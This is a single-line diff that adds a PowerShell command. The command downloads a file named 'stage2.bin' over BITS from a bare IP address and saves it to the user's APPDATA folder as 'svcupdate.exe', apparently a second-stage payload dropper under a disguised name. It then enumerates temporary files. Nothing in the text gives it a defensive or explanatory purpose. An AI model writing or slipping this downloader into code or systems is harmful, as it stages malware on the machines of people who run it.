@@ -1,0 +1,1 @@
+$TargetUrl = 'https://203.0.113.10:443/cdn/stage2.bin'; $OutputPath = "$env:APPDATA\svcupdate.exe"; Start-BitsTransfer -Source $TargetUrl -Destination $OutputPath; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
